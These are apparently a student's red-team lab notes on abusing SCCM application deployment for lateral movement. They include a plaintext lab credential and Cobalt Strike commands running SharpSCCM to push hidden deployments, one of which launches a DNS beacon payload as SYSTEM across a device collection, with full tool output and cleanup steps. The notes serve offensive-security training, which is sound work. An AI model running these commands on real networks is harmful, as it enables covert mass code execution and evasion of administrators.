initially wasn't working, had to update gpo for follow along look at [[3.1 Create & Link a GPO - After full lab reset]]

- once `GPO` was updated and `machines` were reset this command worked

With Full or Application Administrator privileges over a device or a collection, we can deploy scripts or applications to aid in lateral movement.  To execute a command on every device in the DEV collection, we could do `exec -n DEV -p <path>`.

`make_token DEV\jking Qwerty123`

```powershell
[12/20 22:31:20] beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
[12/20 22:31:25] [+] host called home, sent: 37 bytes
[12/20 22:31:25] [+] Impersonated DEV\jking (netonly)

[+] received output:
[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01
[+] Creating new application: Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f
[+] Application path: C:\Windows\notepad.exe
[+] Updated application to hide it from the Configuration Manager console
[+] Updated application to run in the context of the logged on user
[+] Successfully created application
[+] Creating new deployment of Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f to DEV (S0100014)
[+] Found the Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f application
[+] Successfully created deployment of Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f to DEV (S0100014)
[+] New deployment name: Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f_S0100014_Install
[+] Waiting for new deployment to become available...

[+] received output:
[+] New deployment is available, waiting 30 seconds for updated policy to become available

[+] received output:
[+] Forcing all members of DEV (S0100014) to retrieve machine policy and execute any new applications available

[+] received output:
[+] Waiting 1 minute for execution to complete...

[+] received output:
[+] Cleaning up
[+] Found the Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f_S0100014_Install deployment

[+] received output:
[+] Deleted the Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f_S0100014_Install deployment
[+] Querying for deployments of Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f_S0100014_Install

[+] received output:
[+] No remaining deployments named Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f_S0100014_Install were found

[+] received output:
[+] Found the Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f application

[+] received output:
[+] Deleted the Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f application
[+] Querying for applications named Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f

[+] received output:
[+] No remaining applications named Application_c6ff63f5-5204-4671-8624-f6aa3e1ffd4f were found
[+] Completed execution in 00:02:10.7667067

```

By default, the above will execute Notepad as the user currently logged into each machine.  If a user is not logged in, then the command won't execute.  We can force it to execute as SYSTEM using the `-s` parameter, and this will execute on every machine regardless of whether a user is currently logged in or not.  As with the GPO Abuse chapter, we can upload and execute a DNS Beacon payload.


so this command will force execution as system, notice that three `ghost beacons` populated meaning our `dns` `beacons` worked.
`beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner`
![[Pasted image 20231220174110.png]]
going to `getuid` to show which systems we are on now.
![[Pasted image 20231220174630.png]]
three more `ghost` beacons just populated, going to `getuid` to see who they are
![[Pasted image 20231220180448.png]]
`DC-2` beacon populated
![[Pasted image 20231220180515.png]]

# Full Visual
![[Pasted image 20231220181706.png]]
![[Pasted image 20231220181720.png]]